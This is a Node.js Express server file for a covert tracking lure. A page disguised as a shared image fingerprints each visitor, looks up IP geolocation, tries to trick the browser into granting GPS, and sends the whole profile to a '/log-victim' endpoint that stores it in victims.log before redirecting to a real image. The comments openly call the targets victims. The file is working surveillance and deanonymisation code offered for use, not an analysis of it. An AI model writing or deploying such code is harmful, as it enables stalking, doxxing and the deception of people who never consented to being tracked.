const express = require('express');
const config = require('./config');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.set('trust proxy', true);
app.use(express.static('public'));
app.use(express.json());

// Log file for victim data
const LOG_FILE = path.join(__dirname, 'victims.log');

// Helper to log victim data
const logVictim = (data) => {
    const logEntry = `[${new Date().toISOString()}] ${JSON.stringify(data)}\n`;
    fs.appendFileSync(LOG_FILE, logEntry);
    console.log("🔥 Victim profile captured:", data.ip, data.userAgent, data.location || "No GPS");
};

// Main route - serves tracking page disguised as image
app.get('/view-image', (req, res) => {
    const clientIP = req.ip;
    const userAgent = req.get('User-Agent');
    const headers = JSON.stringify(req.headers);

    // Send tracking page
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta property="og:image:type" content="image/jpeg">
            <meta property="og:url" content="${config.BASE_DOMAIN}/view-image">
            <meta property="fb:app_id" content="966242223397117">
            <meta property="og:title" content="Verified Shared Asset">
            <meta property="og:description" content="Loading image...">
            <title>Loading Image...</title>

            <!-- FingerprintJS Pro (free tier) -->
            <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3"></script>

            <script>
                (async () => {
                    // Init FingerprintJS
                    const fpPromise = FingerprintJS.load();

                    // Get public IP and geo via ipapi.co
                    const ipResponse = await fetch('https://ipapi.co/json/');
                    const ipData = await ipResponse.json();

                    // Get browser fingerprint
                    const fp = await fpPromise;
                    const result = await fp.get();
                    const fingerprint = result.visitorId;
                    const components = result.components;

                    // Try to get GPS (trick user into allowing)
                    let location = { lat: null, lng: null };
                    navigator.geolocation.getCurrentPosition?.(
                        (pos) => {
                            location = { lat: pos.coords.latitude, lng: pos.coords.longitude };
                            sendAllData({ ...ipData, location, fingerprint, userAgent: navigator.userAgent, screen: screen });
                        },
                        () => sendAllData({ ...ipData, location, fingerprint, userAgent: navigator.userAgent, screen: screen })
                    );

                    // Fallback: send even without GPS
                    if (!navigator.geolocation) {
                        sendAllData({ ...ipData, location, fingerprint, userAgent: navigator.userAgent, screen: screen });
                    }

                    function sendAllData(data) {
                        // Exfiltrate to our endpoint
                        fetch('/log-victim', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(data),
                            keepalive: true
                        }).then(() => {
                            // Redirect to real image after 1.5s
                            setTimeout(() => {
                                window.location.href = "${config.BASE_DOMAIN}${config.PATHS.abstract}";
                            }, 1500);
                        }).catch(() => {
                            // Redirect anyway
                            window.location.href = "${config.BASE_DOMAIN}${config.PATHS.abstract}";
                        });
                    }
                })();
            </script>
        </head>
        <body style="background:#111;color:#fff;text-align:center;padding:50px;font-family:sans-serif;">
            <h2>🔐 Secure Media Viewer</h2>
            <p>Authenticating session...</p>
            <img src="https://media.giphy.com/media/3oEjI6SIIHBdRxXI40/giphy.gif" width="80" style="margin:20px">
            <p><small>Your connection is being verified for security.</small></p>
        </body>
        </html>
    `);
});

// Endpoint to receive victim data
app.post('/log-victim', express.json(), (req, res) => {
    const payload = req.body;
    const ip = req.ip;
    const fullProfile = {
        ip,
        timestamp: new Date().toISOString(),
        userAgent: payload.userAgent,
        city: payload.city,
        region: payload.region,
        country: payload.country_name,
        country_code: payload.country_code,
        latitude: payload.latitude,
        longitude: payload.longitude,
        timezone: payload.timezone,
        org: payload.org,
        asn: payload.asn,
        screen_resolution: `${payload.screen?.width}x${payload.screen?.height}`,
        device: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(payload.userAgent) ? "Mobile" : "Desktop",
        platform: payload.screen?.platform || "Unknown",
        language: payload.screen?.language,
        fingerprint: payload.fingerprint,
        referer: req.get('Referer') || null
    };

    logVictim(fullProfile);
    res.status(200).send('OK');
});

app.listen(PORT, () => {
    console.log(`🔥 Tracking server running on port ${PORT}`);
    console.log(`🔗 Send victims to: ${config.BASE_DOMAIN}/view-image`);
});